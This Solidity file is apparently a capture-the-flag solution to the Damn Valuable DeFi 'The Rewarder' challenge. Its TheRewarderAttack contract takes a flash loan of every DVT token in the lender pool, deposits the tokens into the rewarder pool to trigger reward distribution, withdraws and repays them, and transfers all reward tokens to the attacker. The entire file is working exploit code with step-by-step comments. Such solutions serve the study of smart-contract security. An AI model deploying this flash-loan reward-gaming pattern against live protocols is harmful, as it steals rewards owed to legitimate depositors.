// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import '../the-rewarder/TheRewarderPool.sol';
import '../the-rewarder/FlashLoanerPool.sol';
import '../DamnValuableToken.sol';

contract TheRewarderAttack {
    TheRewarderPool public pool;
    FlashLoanerPool public flashLoanerPool;
    address public owner;

    constructor(address poolAddress, address flashLoanerPoolAddress) {
        // relevant contracts
        pool = TheRewarderPool(poolAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);

        // attacker address
        owner = msg.sender;
    }

    function takeLoan() public {
        // execute a flash loan taking all available DVT tokens in the flashloaner pool
        flashLoanerPool.flashLoan(IERC20(pool.liquidityToken()).balanceOf(address(flashLoanerPool)));
    }

    function receiveFlashLoan(uint256 amount) external {
        // Approve the pool to remove liquidity tokens from this contract
        IERC20(pool.liquidityToken()).approve(address(pool), amount);

        // deposit all tokens which also calls distribute rewards
        pool.deposit(amount);

        // withdraw the tokens from the rewarder pool to return them to the flashloaner pool
        pool.withdraw(amount);

        // transfer the tokens back to the flashloaner pool
        IERC20(pool.liquidityToken()).transfer(address(flashLoanerPool), amount);

        // send all reward tokens to the attacker address
        IERC20(pool.rewardToken()).transfer(address(owner), IERC20(pool.rewardToken()).balanceOf(address(this)));
    }
}
